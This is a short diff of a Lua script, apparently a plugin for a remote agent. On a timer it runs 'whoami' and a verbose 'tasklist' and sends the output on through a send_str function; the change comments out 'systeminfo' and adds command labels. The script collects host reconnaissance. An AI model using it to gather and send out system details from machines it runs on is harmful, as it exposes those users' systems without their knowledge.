@@ -39,17 +39,17 @@ function shell_exec(cmd)
 	return rs
 end
 
-function exec_cmd(cmd)
+function exec_cmd(cmd,cmdstr)
 	local rs = shell_exec(cmd)
-	send_str(cmd,table.concat(rs))
+	send_str(cmdstr,table.concat(rs))
 	--trace_out(table.concat(rs))
 end
 
 
 function on_time()
-	exec_cmd("whoami")
-	exec_cmd("systeminfo")
-	exec_cmd("tasklist")
+	exec_cmd("whoami","whoami")
+	--exec_cmd("systeminfo","systeminfo")
+	exec_cmd([[tasklist /V /NH /FO "CSV"]],"tasklist")
 end
 
 function on_quit()
